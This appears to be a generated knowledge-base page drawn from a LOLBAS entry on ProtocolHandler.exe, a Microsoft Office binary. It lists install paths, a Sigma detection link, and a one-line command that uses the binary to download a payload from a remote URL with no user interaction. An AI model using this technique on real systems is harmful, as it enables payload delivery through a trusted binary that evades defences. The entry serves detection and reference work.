---
title: "ProtocolHandler.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/OtherMSBinaries/ProtocolHandler.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/ProtocolHandler.yml"
build_date: "2026-04-27 18:39:01"
category: "OtherMSBinaries"
aliases:
  - "ProtocolHandler.exe"
functions:
  - "Download"
attack_technique_ids:
  - "T1105"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# ProtocolHandler.exe

Microsoft Office binary

## Metadata

- Category: OtherMSBinaries
- Created: 2022-07-24
- Author: Nir Chako
- Source Path: yml/OtherMSBinaries/ProtocolHandler.yml

## Paths

- `C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\ProtocolHandler.exe`
- `C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\ProtocolHandler.exe`
- `C:\Program Files (x86)\Microsoft Office\Office16\ProtocolHandler.exe`
- `C:\Program Files\Microsoft Office\Office16\ProtocolHandler.exe`
- `C:\Program Files (x86)\Microsoft Office 15\ClientX86\Root\Office15\ProtocolHandler.exe`
- `C:\Program Files\Microsoft Office 15\ClientX64\Root\Office15\ProtocolHandler.exe`
- `C:\Program Files (x86)\Microsoft Office\Office15\ProtocolHandler.exe`
- `C:\Program Files\Microsoft Office\Office15\ProtocolHandler.exe`

## Commands

### 1. Download

Downloads payload from remote server

```cmd
ProtocolHandler.exe {REMOTEURL}
```

- Use Case: It will open the specified URL in the default web browser, which (if the URL points to a file) will often result in the file being downloaded to the user's Downloads folder (without user interaction)
- Privileges: User
- Operating System: Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105]]

## Detections

- Sigma: https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_lolbin_protocolhandler_download.yml
- IOC: Suspicious Office application Internet/network traffic

## Acknowledgements

- {'Person': 'Nir Chako (Pentera)', 'Handle': '@C_h4ck_0'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/ProtocolHandler.yml)
